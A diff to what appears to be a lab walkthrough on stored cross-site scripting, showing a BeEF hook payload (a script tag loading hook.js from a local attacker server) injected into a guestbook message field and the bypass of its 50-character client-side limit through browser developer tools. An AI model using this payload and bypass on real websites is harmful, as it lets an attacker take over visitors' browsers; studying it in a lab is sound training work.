@@ -115,7 +115,7 @@ Start the `Terminal` in your Virtual Machine.
   2. Write the `Payload: <script src="http://127.0.0.1:3000/hook.js"></script>`
 
 #### 4. Inject this payload  
-  - When trying to inject the payload there was an issue found, in the message box field, there was a limit of `maxlength="50"` character in the source code. Therefore we could not inject the payload.
+  - Inject in the message box field with <script src="http://127.0.0.1:3000/hook.js"></script>, it can't display more than 50 characters because there was a limit of `maxlength="50"` character in the source code.
   ![maxlength=50](/text_change_90.PNG)
   
   - Solution: From the Browser press `Ctrl+Shift+I` for Developer Tools. Under the `Element` in Chrome or `Inspector` in Firefox locate the `<div class="body_padded">` and in sub categories, locate the `<textarea name="mtxMessage" cols="50" rows="3" maxlength="50">`. Change the maxlength to any number greater than 50, for example `maxlength="75"`, or just remove this code limit.
